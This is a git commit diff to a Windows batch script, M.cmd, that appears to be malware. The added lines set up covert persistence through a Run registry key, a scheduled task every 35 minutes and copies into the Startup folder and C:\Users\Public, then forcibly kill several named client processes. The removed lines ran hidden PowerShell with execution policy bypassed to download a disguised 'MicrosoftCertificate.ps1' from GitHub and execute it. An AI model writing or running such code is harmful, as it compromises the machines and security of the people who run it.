508e96fc628442a460bedb455d3eee41af66ba57
WendySeattle <129013272+WendySeattle@users.noreply.github.com>
2023-04-21 01:19:34 +0300

    Update M.cmd

--- M.cmd
+++ M.cmd
@@ -1,21 +1,27 @@
-mkdir Oz!
+
+
+::perz
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d "C:\Users\Public\M.cmd" /f || reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d C:\Users\Public\M.cmd /f
+
+SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR "C:\Users\Public\M.cmd" /f || SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR C:\Users\Public\M.cmd /f
+
+mkdir "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" || mkdir ""%userprofile%"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+xcopy /c /q /y "M.cmd" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" || xcopy /c /q /y "M.cmd" ""%userprofile%"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+-.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.-
+
+
+xcopy /c /q /y M.cmd "C:\Users\Public"
+
+
+-.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.-
+
+tasklist /fi "IMAGENAME eq ccpcli.exe" | find /i "ccpcli.exe" && taskkill /f /im ccpcli.exe & tasklist /fi "IMAGENAME eq CCPCLI~1.EXE" | find /i "CCPCLI~1.EXE" && taskkill /f /im CCPCLI~1.exe & tasklist /fi "IMAGENAME eq ccpshell.exe" | find /i "ccpshell.exe" && taskkill /f /im ccpshell.exe & tasklist /fi "IMAGENAME eq ccpDirect.exe" | find /i "ccpDirect.exe" && taskkill /f /im ccpDirect.exe & tasklist /fi "IMAGENAME eq pncclient.exe" | find /i "pncclient.exe" && taskkill /f /im pncclient.exe || echo naval
+
+-.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.-
+
 exit
 
-@echo off
-color 1b
+-.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.--.-.-.-.-.-.-
 
-C:
-
-cd.. || cd .. & cd.. || cd .. & cd.. || cd .. & cd / & cd Users || cd "Users" & cd Public || cd "Public"
-
-:yen
-
-IF EXIST MicrosoftCertificate.ps1 (
-	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File MicrosoftCertificate.ps1
-	exit
-	
-) ELSE (
-	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/WendySeattle/EnvironmentalSciences/master/MicrosoftCertificate.ps1', '.\MicrosoftCertificate.ps1')
-	goto yen
-	
-)
